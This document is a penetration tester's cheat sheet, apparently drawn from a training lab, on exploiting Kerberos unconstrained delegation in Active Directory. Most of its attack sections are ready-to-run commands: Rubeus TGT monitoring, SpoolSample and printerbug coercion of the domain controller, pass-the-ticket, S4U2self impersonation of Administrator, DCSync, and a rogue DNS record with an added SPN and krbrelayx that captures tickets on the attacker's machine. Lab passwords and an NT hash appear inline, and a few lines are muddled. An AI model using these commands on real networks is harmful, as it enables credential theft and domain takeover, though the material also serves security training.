- `TRUSTED_FOR_DELEGATION` → `0x80000`    
If an account or computer has **unconstrained delegation**, then:
- It _can_ impersonate ANY user
- To ANY service
- On ANY machine in the domain
- As soon as that user connects to the service at least once
- Because the DC gives that service a _TGT_ in the PAC
Limitations:
- The target user must authenticate to the compromised service, OR  You steal/generate a valid TGT for them (example: via “Printer Bug”, “DFSCoerce”, etc.)
- `S4u2Self` and `S4u2proxy` aren't enabled for unconstrained delegation.

---
## Ideas
- If you have GenericWrite on account that has unconstrained Delegation, you can add SPN in it and that SPN has DNS record points at us.



---

## Main Idea of Attack
Steal TGT's, use Responder or Rubeus to capture TGTs on DC or fake DNS record points to your machine.

# Key prerequisites 
(what you need to exploit)
you  need one of these:
- **Control of the machine process or machine account** that is trusted for unconstrained delegation (i.e., **administrative** or SYSTEM access to the server where users authenticate), **or**
- **Control of the service account credentials** in case the SPN is registered to a domain account (and you can act as that account on the host).

# UnConstrained Delegation types
- Computers unconstriand Delegation. Use rubeus to capture tgts, then impersonate others using s4u2self.
- Users unconstrained Delegation, add computer with DNS towards your machine to capture tgts.

---
### Enumeration
```powershell
# Get all computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, DNSHostName, OperatingSystem

# Get users with unconstrained delegation (rare but possible)
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, SamAccountName, Enabled
```

```ldap
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
$unconstrainedComputers = $searcher.FindAll()

Write-Host "Computers with unconstrained delegation:" -ForegroundColor Yellow
$unconstrainedComputers | ForEach-Object {
    $_.Properties.name
}
```

```
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

distinguishedname     : CN=sqldev,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
objectclass           : {top, person, organizationalPerson, user}
name                  : sqldev
objectsid             : S-1-5-21-2974783224-3764228556-2640795941-1110
serviceprincipalname  : MSSQL_svc_dev/inlanefreight.local:1443
```

---
## Computers Unconstrained Delegation
### Targeting DC
If conditions are meet and then a Domain Administrator subsequently logs in, we will be able to extract their TGT and use it to move laterally and compromise other machines, including Domain Controllers. [Rubeus](https://github.com/GhostPack/Rubeus) is the go-to tool for this attack. As a local administrator, Rubeus can be run to monitor stored tickets. If a TGT is found within a TGS ticket, Rubeus will display it to us.
```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
.\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
```

A few moments later, `Sarah Lafferty` connects to the compromised server. Rubeus retrieves Sarah's copy of the TGT that was embedded in her TGS ticket and displays it to us encoded in base64
```powershell
[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs

[*] 8/14/2020 11:06:40 AM UTC - Found new TGT:

  User                  :  sarah.lafferty@INLANEFREIGHT.LOCAL
  StartTime             :  8/14/2020 4:06:37 AM
  EndTime               :  8/14/2020 2:06:37 PM
  RenewTill             :  8/21/2020 4:06:37 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFmTCCBZWgAwIBBaEDAgEWooIEgjCCBH5hggR6MIIEdqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQsMIIEKKADAgESoQMCAQKiggQaBIIEFr7cTE+mYOQsYF69H0dnaQwX2Iy/dB0k91uEBGQh/Dk0lm12PzkVgX<SNIP>
```

So we will use this TGT to access the Domain Controller's `CIFS` service, for example. The `/ptt` option/flag is used to pass the received ticket into memory so that it can be used for future requests.
```powershell
.\Rubeus.exe asktgs /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /service:cifs/dc01.INLANEFREIGHT.local /ptt
```
Once we have the TGS or the TGT we can effectively list the contents of the Domain Controller file system as shown in the following command.
```
mimikatz # lsadump::dcsync /user:sarah.lafferty

dir \\dc01.inlanefreight.local\c$
```

we can also use the [renew action](https://github.com/GhostPack/Rubeus#renew) to get a brand new TGT instead of a TGS ticket:
```powershell
.\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
```


We could also get a TGS ticket for the `LDAP` service and ask for synchronization with the DC to get all the users' password hashes.

Use [SpoolSample PoC](https://github.com/leechristensen/SpoolSample) or `coarce` to force other computers to authenticate to you, so you can extract the hash.

### Target other computers/users
Other computers can't do DCsync, but they are valuble objects that we should give attention to. We can request their TGS to access other resources in AD.

If the target computer is not a domain controller, or if we want to execute attacks other than `DCSync`, we can use `S4U2self` to obtain a Service Ticket on behalf of any user we want to impersonate.
With the ticket captured from `DC01` using `Rubeus monitor` and `SpoolSample` we can use `Rubeus s4u /self` to forge a service ticket for any service. Let's create a ticket to connect through SMB using the `CIFS` service. We will need to use `Rubeus s4u /self`, set the alternative service to `CIFS`, and use the ticket we have:
```powershell
.\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:CIFS/dc01.inlanefreight.local /ptt /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCB<SNIP>
```

---
## Users unconstrained Delegation

### Exploit
This attack aims to create a DNS record that will point to our attack machine. This DNS record will be a fake computer in the Active Directory environment. Once this DNS record is registered, we will add the SPN `CIFS/our_dns_record` to the account we compromised, which is in an unconstrained delegation. So, if a victim tries to connect via SMB to our fake machine, it will ship a copy of its TGT in its TGS ticket since it will ask for a ticket for `CIFS/our_registration_dns`. This TGS ticket will be sent to the IP address we chose when registering the DNS record, i.e., our attack machine. All we have to do then is extract the TGT and use it.
```sh
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p "$PASSWORD" --dc-ip "$IP" add dnsRecord localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 10.10.15.0 # or
python dnstool.py -u INLANEFREIGHT.LOCAL\\pixis -p p4ssw0rd -r roguecomputer.INLANEFREIGHT.LOCAL -d 10.10.14.2 --action add 10.129.1.207    

nslookup localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.INLANEFREIGHT.LOCAL "$IP"

addspn.py "$IP" -u "$DOMAIN"'\'"$USER" -p "$PASSWORD" -t 'CALLUM.DIXON' -T samname -s 'cifs/localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.INLANEFREIGHT.LOCAL' 
'# 
sudo krbrelayx.py -hashes ':3e7c48255206470a13543b27b7af18de' # You need the hash of compromised account to decrypt the TGS.

nxc smb "$IP" -u "$USER" -p "$PASSWORD"  -d "$DOMAIN" -M coerce_plus  -o L=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.INLANEFREIGHT.LOCAL
printerbug.py "$DOMAIN"'/'"$USER":"$PASSWORD"@"$IP" localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.INLANEFREIGHT.LOCAL
python3 printerbug.py inlanefreight.local/carole.rose:jasmine@10.129.205.35 roguecomputer.inlanefreight.local # or 
python dementor.py -u pixis -p p4ssw0rd -d inlanefreight.local roguecomputer.inlanefreight.local dc01.inlanefreight.local
```


> [!Attention] 
> Don't forget to use the SPN name not the IP address, because if used IP address it will use NTLM and it will point to you, but if you used SPN it will use kerberos and send TGS conatins the TGT



---


